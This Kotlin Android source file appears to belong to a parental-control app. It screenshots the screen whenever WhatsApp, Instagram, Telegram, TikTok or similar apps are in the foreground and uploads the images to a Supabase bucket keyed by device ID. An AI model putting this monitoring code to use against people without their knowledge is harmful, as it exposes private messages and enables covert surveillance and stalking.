package com.example.parentalcontrol

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.util.DisplayMetrics
import android.view.WindowManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import android.app.usage.UsageStatsManager

/**
 * محرك التقاط الشاشة
 * يقوم بالتقاط صور للشاشة ورفعها إلى السحاب
 */
class ScreenCaptureEngine(private val context: Context) {

    companion object {
        private const val TAG = "ScreenCaptureEngine"
        private const val BUCKET_NAME = "monitoring_data"
        private val TARGET_APPS = listOf(
            "com.whatsapp",
            "com.facebook.orca", // Messenger
            "com.instagram.android",
            "com.snapchat.android",
            "com.twitter.android",
            "com.google.android.youtube",
            "com.zhiliaoapp.musically", // TikTok
            "org.telegram.messenger",
            "com.android.chrome",
            "com.facebook.katana" // Facebook App
        )
    }

    /**
     * تنفيذ عملية الالتقاط والرفع
     */
    suspend fun captureAndUpload(projection: MediaProjection, forceCapture: Boolean = false) = withContext(Dispatchers.IO) {
        // 1. التحقق من حالة الشاشة لتوفير البطارية (لا نصور والشاشة مغلقة)
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        if (!powerManager.isInteractive) {
            Log.d(TAG, "Screen is OFF. Skipping capture to save battery.")
            return@withContext
        }

        // 2. التحقق من التطبيق المستهدف
        val currentApp = if (!forceCapture) getForegroundApp() else null
        if (!forceCapture && (currentApp == null || !TARGET_APPS.contains(currentApp))) {
            Log.d(TAG, "Skipping capture: foreground app ($currentApp) is not in target list.")
            return@withContext
        }

        try {
            Log.i(TAG, "Starting screen capture...")
            
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getRealMetrics(metrics)
            
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            // إعداد ImageReader لالتقاط الإطار
            @SuppressLint("WrongConstant")
            val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            var virtualDisplay: VirtualDisplay? = null

            try {
                virtualDisplay = projection.createVirtualDisplay(
                    "ScreenCapture",
                    width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.surface, null, null
                )

                // المحاولة عدة مرات لالتقاط صورة صحيحة
                var image: android.media.Image? = null
                for (retry in 1..10) {
                    image = imageReader.acquireLatestImage()
                    if (image != null) break
                    kotlinx.coroutines.delay(200L) // انتظار 200 مللي ثانية بين المحاولات
                }

                if (image != null) {
                    try {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width

                        val bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        
                        // قص الصورة للحجم الأصلي (إزالة الـ padding)
                        val cleanBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                        
                        // حفظ كـ WebP مضغوط
                        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                        val fileName = "screen_${timestamp}.webp"
                        val file = File(context.cacheDir, fileName)
                        
                        FileOutputStream(file).use { out ->
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                                cleanBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 75, out)
                            } else {
                                @Suppress("DEPRECATION")
                                cleanBitmap.compress(Bitmap.CompressFormat.WEBP, 75, out)
                            }
                        }

                        // الرفع إلى Supabase
                        val supabase = SupabaseManager.getInstance()
                        val result = supabase.uploadFile(
                            file = file,
                            bucket = BUCKET_NAME,
                            folder = "screenshots/${getDeviceId()}",
                            customFileName = fileName
                        )

                        if (result is UploadResult.Success) {
                            Log.i(TAG, "Screenshot uploaded successfully: ${result.publicUrl}")
                        } else {
                            Log.e(TAG, "Upload failed")
                        }
                        
                        // تنظيف الملف المؤقت
                        file.delete()
                    } finally {
                        image.close()
                    }
                } else {
                    Log.e(TAG, "Failed to acquire image from ImageReader")
                }
            } finally {
                virtualDisplay?.release()
                imageReader.close()
            }

        } catch (e: Exception) {
            Log.e(TAG, "General screen capture error: ${e.message}", e)
        }
    }

    private fun getDeviceId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    /**
     * جلب اسم حزمة التطبيق الموجود حالياً في المقدمة
     */
    private fun getForegroundApp(): String? {
        try {
            val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val time = System.currentTimeMillis()
            val stats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 60, time)
            
            if (stats != null) {
                var latestStats: android.app.usage.UsageStats? = null
                for (usageStats in stats) {
                    if (latestStats == null || usageStats.lastTimeUsed > latestStats.lastTimeUsed) {
                        latestStats = usageStats
                    }
                }
                return latestStats?.packageName
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting foreground app: ${e.message}")
        }
        return null
    }
}
